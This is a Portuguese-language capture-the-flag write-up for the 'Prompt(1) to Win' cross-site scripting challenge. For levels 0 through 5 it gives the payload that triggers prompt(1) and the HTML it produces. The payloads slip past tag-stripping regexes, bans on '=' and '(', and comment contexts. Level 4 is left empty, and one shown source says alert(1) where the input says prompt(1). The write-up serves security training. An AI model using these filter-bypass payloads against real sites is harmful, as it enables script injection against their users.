# Prompt(1) to Win
###### Solved by @joaoselim
>This CTF is about XSS, JavaScript, Injeção de Código
## About the challenge
Nesse desafio de XSS(Cross-Site Scripting) temos o objetivo de realizar diversas injeções de código JavaScript, para chamar prompt(1) através de 15 níveis diferentes

## Solutions
#### Desafio 0:

[![questao0.png](https://i.postimg.cc/W4g2WgjP/questao0.png)](https://postimg.cc/kVM3DVBj)

Input:
```
"><script>prompt(1)</script>
```
Nesse primeiro caso temos um código simples, sem filtragem, oque devemos nos atentar é em sair do atributo `value="` usando `"`, e encerrar a tag `input` usando `/>`. A partir daí
inserimos nosso script `<script>prompt(1)</script>`

HTML Source:
```
<input type="text" value=""><script>alert(1)</script>">
```

#### Desafio 1:

[![questao1.png](https://i.postimg.cc/cL9SFhPj/questao1.png)](https://postimg.cc/jD7m5HxQ)

Input:
```
<svg/ onload=prompt(1) 
```
Seguido de uma quebra de linha ou espaço.

Agora começamos a ter que contornar tipos de filtragem. Nessa questão a regex `/<\/?[^>]+>/gi` faz com que ao inserirmos qualquer informação em uma tag HTML encerrada por `>` será 
substituido no código por `''`, para isso, abrimos o construtor `<` e fornecemos um tipo de imagem svg, e usamos uma `/` para que ocorra uma quebra no formato da tag, em seguida afirmamos para o código 
usando o `onload` que ao carregar a imagem deve chamar `prompt(1)`

HTML Source:
```
<article><svg/ onload=prompt(1)
</article>
```

#### Desafio 2:

[![questao2.png](https://i.postimg.cc/13hHLVNK/questao2.png)](https://postimg.cc/zV7KhB7L)

Input:
```
<svg><script>prompt&#40;1)</script>
```
Ainda lidando com filtragem, agora não podemos usar nem `=` nem `(`, ent para isso tem se conhecimento que todas as teclas de um teclado tem um código correspondente, no caso do `(` é `&#40`. Iniciamos nosso input abrindo a tag `<svg>`, concluimos colocando um script dentro dela `<script></script>` e chamando o prompt(1) dentro da tag script

HTML Source:
```
<svg><script>prompt&#40;1)</script>
```

#### Desafio 3:

[![questao3.png](https://i.postimg.cc/yx6bwggd/questao3.png)](https://postimg.cc/9RSb9fB5)

Input:
```
--!><svg onload=prompt(1)
```
Nessa questão nosso input está sendo colocado dentro de `<!--...-->`, então tudo que escrevemos é visto pelo código como comentário, então precisamos encerrar a sessão de comentarios.
Para isso é possível usar de 2 formas, `-->` e `--!>`, mas como temos a filtragem de `->` então temos de usar a segunda opção. 
Então seguimos nosso input com um tipo `svg` em que ao ser carregado chama o `prompt(1)`

HTML Source:
```
<!-- --!><svg onload=prompt(1) -->
```

#### Desafio 4:

[![questao4.png](https://i.postimg.cc/nz5tYGwx/questao4.png)](https://postimg.cc/mzQqTCsp)

Input:
```

```
resolução

HTML Source:
```

```

#### Desafio 5:

[![questao5.png](https://i.postimg.cc/R0kkWZ3C/questao5.png)](https://postimg.cc/GBj7NrJ6)

Input:
```
"type=image src onerror
="prompt(1)
```


HTML Source:
```
<input value=""type=image src onerror
="prompt(1)" type="text">
```
